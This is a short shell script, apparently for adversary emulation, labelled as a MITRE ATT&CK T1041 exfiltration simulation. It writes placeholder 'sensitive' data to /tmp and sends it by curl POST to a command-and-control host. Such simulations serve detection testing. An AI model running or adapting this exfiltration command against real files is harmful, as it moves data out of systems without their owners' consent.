#!/bin/sh
# Simulación de Exfiltration
# MITRE ATT&CK: T1041

echo "[EXFIL] Creando archivo sensible"
echo "CLIENTES, CONTRATOS, FINANZAS" > /tmp/data.txt

echo "[EXFIL] Enviando datos al C2 vía HTTP POST"
curl -X POST -d "@/tmp/data.txt" http://cat13-c2-server/index.php
